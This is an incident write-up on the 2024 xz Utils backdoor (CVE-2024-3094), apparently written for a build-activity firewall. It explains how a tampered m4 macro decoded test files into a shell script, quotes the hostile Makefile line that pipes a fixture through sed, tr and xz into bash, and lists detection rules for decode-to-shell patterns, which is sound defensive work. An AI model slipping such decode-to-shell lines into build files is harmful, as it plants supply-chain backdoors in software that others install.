# xz Utils backdoor ran attacker code from a build script during compilation

- Date: 2024-02/03 (tarballs); disclosed 2024-03-29 | Agent/tool: xz/liblzma build system (m4 macros, configure, make) | Axis: supply

## What happened

A patient attacker spent years earning maintainer trust in the xz project and then backdoored the release tarballs of versions 5.6.0 and 5.6.1. The backdoor lived only in the released tarballs, not in the git repository: a modified build macro file (build-to-host.m4) was added to the tarball alone. When a distribution builder ran configure, that macro decoded two innocuous-looking "test" files into a bash script and executed it. The script rewired the build so that compilation injected an extra object file into liblzma. On x86-64 glibc systems building Debian or RPM packages, the result was a backdoored liblzma, and sshd (which links libsystemd, which links lzma) gained a hidden pre-authentication hook that could allow remote code execution. Developer Andres Freund uncovered it on March 29, 2024 after noticing sshd logins burning CPU and valgrind errors. Red Hat assigned CVE-2024-3094.

## How it went wrong

The build itself was the attack surface. The tampered macro arranged for the Makefile to contain a line shaped like:

`sed rpath ../../../tests/files/bad-3-corrupt_lzma2.xz | tr "\t-_" " _-" | xz -d | /bin/bash >/dev/null 2>&1`

So during make, the build system piped a "test data" file through decoders into bash. The decoded script checked that the target was x86-64 linux-gnu with gcc and GNU ld and that a Debian/RPM build was running, then injected the payload object. Later, the injected code hooked ifunc resolvers and redirected the RSA_public_decrypt PLT entry inside sshd. The whole attack happened in ordinary build processes: exec of configure, make, sed, tr, xz, bash, reading project files and writing build outputs. No exploit at install time, no strange binaries shipped in the tarball.

## What the firewall should learn

The core observable is decode-to-shell inside a build: exec (or input) where a file or fixture is piped through a decoder (sed|tr, xz -d, gunzip, openssl enc -d) into a shell. The builtin base64-to-shell rule covers base64, openssl and xxd, but not this xz/tr shape, so the pattern is a gap. Rule ideas: (1) approval_required (leaning deny) for any pipeline that decodes a non-source file into bash/sh, keyed on exec argv or captured input text; (2) correlate a file_open read of a data/test file with a same-ancestry shell exec fed from that read (decision: approval_required); (3) treat a build step that rewrites its own build files (Makefile, configure output) mid-build and then executes generated code from them as approval_required, because legitimate builds rarely do that.

## Sources

- [Andres Freund, oss-security: backdoor in upstream xz/liblzma leading to ssh server compromise](https://www.openwall.com/lists/oss-security/2024/03/29/4)
- [Snyk: The XZ backdoor — CVE-2024-3094](https://snyk.io/blog/the-xz-backdoor-cve-2024-3094/)
- [Akamai: XZ Utils backdoor — everything you need to know](https://www.akamai.com/blog/security-research/critical-linux-backdoor-xz-utils-discovered-what-to-know)
